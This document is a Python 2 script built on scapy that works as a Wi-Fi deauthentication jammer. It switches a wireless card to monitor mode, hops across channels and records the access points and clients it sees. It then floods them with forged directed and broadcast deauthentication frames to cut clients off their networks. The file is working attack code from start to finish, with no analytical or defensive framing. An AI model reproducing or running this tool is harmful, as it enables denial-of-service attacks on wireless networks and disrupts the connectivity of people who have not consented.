#!/usr/bin/env python
# -*- UTF-8 -*-

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
from scapy.all import *
conf.verb = 0 
import os
import sys
import time
from threading import Thread, Lock
from subprocess import Popen, PIPE
from signal import SIGINT, signal
import argparse
import socket
import struct
import fcntl

# Console colors"
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

def parse_args():
    #Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument("-s",
                        "--skip",
                        nargs='*',
                        default=[],
                        help="MAC address. \
                                Example: -s 00:11:BB:33:44:AA")
    parser.add_argument("-i",
                        "--interface",
                        help="Interface. \
                                Example: -i mon5")
    parser.add_argument("-c",
                        "--channel",
                        help="Channel. \
                                Example: -c 6")
    parser.add_argument("-m",
                        "--maximum",
                        help="Maximum number of clients to deauth. \
                                Example: -m 5")
    parser.add_argument("-n",
                        "--noupdate",
                        help="Try:-m 10 -n",
                        action='store_true')
    parser.add_argument("-t",
                        "--timeinterval",
                        help="Time interval try: -t .00001")
    parser.add_argument("-p",
                        "--packets",
                        help="Packets: \
                                Default: 1;")
    parser.add_argument("-d",
                        "--directedonly",
                        help="Deauthenticatication Packet",
                        action='store_true')
    parser.add_argument("-a",
                        "--accesspoint",
                        nargs='*',
                        default=[],
                        help="Enter SSID or MAC address of target")
    parser.add_argument("--world",
                        help="American standard:11  \
                                World:13",
                        action="store_true")

    return parser.parse_args()


#Manupulation Starts

def get_mon_iface(args):
    global monitor_on
    monitors, interfaces = iwconfig()
    if args.interface:
        monitor_on = True
        return args.interface
    if len(monitors) > 0:
        monitor_on = True
        return monitors[0]
    else:
        # Start monitor mode on a wireless interface
        print '['+G+'*'+W+'] Powerful Interface'
        interface = get_iface(interfaces)
        mon_mode = start_mon_mode(interface)
        return mon_mode

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    except OSError:
        sys.exit('['+R+'-'+W+'] Failed "iwconfig"')
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Not an empty string
        if line[0] != ' ': # Does not start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: # Not wired
                iface = line[:line.find(' ')] # interface
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces

def get_iface(interfaces):
    scanned_aps = []

    if len(interfaces) < 1:
        sys.exit('['+R+'-'+W+'] Try again')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface

    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line: 
               count += 1
        scanned_aps.append((count, iface))
        print '['+G+'+'+W+'] Networks '+G+iface+W+': '+T+str(count)+W
    try:
        interface = max(scanned_aps)[1]
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print '['+R+'-'+W+'] Minor error:',e
            print '    Monitor:ON '+G+interface+W
            return interface

def start_mon_mode(interface):
    print '['+G+'+'+W+'] Monitor:OFF '+G+interface+W
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode monitor' % interface)
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('['+R+'-'+W+'] Failed to start monitor mode')

def remove_mon_iface(mon_iface):
    os.system('ifconfig %s down' % mon_iface)
    os.system('iwconfig %s mode managed' % mon_iface)
    os.system('ifconfig %s up' % mon_iface)

def mon_mac(mon_iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
    return mac


def channel_hop(mon_iface, args):

    global mon_channel, first_pass

    channelNum = 0
    maxChan = 11 if not args.world else 13
    err = None

    while 1:
        if args.channel:
            with lock:
                mon_channel = args.channel
        else:
            channelNum +=1
            if channelNum > maxChan:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                mon_channel = str(channelNum)

            try:
                proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', mon_channel], stdout=DN, stderr=PIPE)
            except OSError:
                print '['+R+'-'+W+'] Could not execute "iw"'
                os.kill(os.getpid(),SIGINT)
                sys.exit(1)
            for line in proc.communicate()[1].split('\n'):
                if len(line) > 2: 
                    err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W

        output(err, mon_channel)
        if args.channel:
            time.sleep(.05)
        else:
            if first_pass == 1:
                time.sleep(1)
                continue

        deauth(mon_channel)


def deauth(mon_channel):

    pkts = []

    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                if ch == mon_channel:
                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
    if len(APs) > 0:
        if not args.directedonly:
            with lock:
                for a in APs:
                    ap = a[0]
                    ch = a[1]
                    if ch == mon_channel:
                        deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                        pkts.append(deauth_ap)

    if len(pkts) > 0:
        if not args.timeinterval:
            args.timeinterval = 0
        if not args.packets:
            args.packets = 1

        for p in pkts:
            send(p, inter=float(args.timeinterval), count=int(args.packets))

def output(err, mon_channel):
    os.system('clear')
    if err:
        print err
    else:
        print '['+G+'+'+W+'] '+mon_iface+' channel: '+G+mon_channel+W+'\n'
    if len(clients_APs) > 0:
        print '                  Deauthing                 ch   ESSID'
    with lock:
        for ca in clients_APs:
            if len(ca) > 3:
                print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W
            else:
                print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2]
    if len(APs) > 0:
        print '\n      Access Points     ch   ESSID'
    with lock:
        for ap in APs:
            print '['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W
    print ''

def noise_filter(skip, addr1, addr2):
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
    if skip:
        ignore += [addr.lower() for addr in skip]
    for i in ignore:
        if i in addr1 or i in addr2:
            return True

def cb(pkt):
    global clients_APs, APs
    if args.maximum:
        if args.noupdate:
            if len(clients_APs) > int(args.maximum):
                return
        else:
            if len(clients_APs) > int(args.maximum):
                with lock:
                    clients_APs = []
                    APs = []

    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:
            pkt.addr1 = pkt.addr1.lower()
            pkt.addr2 = pkt.addr2.lower()

            if args.accesspoint:
                if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt[Dot11Elt].info in args.accesspoint:
                    args.accesspoint.add(pkt[Dot11].addr3.lower())
                if not args.accesspoint.intersection([pkt.addr1.lower(), pkt.addr2.lower()]):
         
                    return

            if args.skip:
                if pkt.addr2 in args.skip:
                    return

            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel, args.world)

            
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)

def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
    ssid       = pkt[Dot11Elt].info
    bssid      = pkt[Dot11].addr3.lower()
    try:
        
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11'] if not args.world else ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13'] 
        if ap_channel not in chans:
            return

        if chan_arg:
            if ap_channel != chan_arg:
                return

    except Exception as e:
        return

    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])

def clients_APs_add(clients_APs, addr1, addr2):
    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, mon_channel])
        else:
            AP_check(addr1, addr2)

    
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            with lock:
                return clients_APs.append([addr1, addr2, mon_channel])

def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])

def stop(signal, frame):
    if monitor_on:
        sys.exit('\n['+R+'!'+W+'] Closing')
    else:
        remove_mon_iface(mon_iface)
        os.system('service network-manager restart')
        sys.exit('\n['+R+'!'+W+'] Closing')

if __name__ == "__main__":
    if os.geteuid():
        sys.exit('['+R+'-'+W+'] Run as root')
    clients_APs = []
    APs = []
    DN = open(os.devnull, 'w')
    lock = Lock()
    args = parse_args()
    args.skip = list(map(str.lower, args.skip))
    args.accesspoint = set(_.lower() if ':' in _ else _ for _ in args.accesspoint)
    monitor_on = None
    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1

    hop = Thread(target=channel_hop, args=(mon_iface, args))
    hop.daemon = True
    hop.start()

    signal(SIGINT, stop)

    try:
        sniff(iface=mon_iface, store=0, prn=cb)
    except Exception as msg:
        remove_mon_iface(mon_iface)
        os.system('service network-manager restart')
        print '\n['+R+'!'+W+'] Closing'
        sys.exit(0)

# END
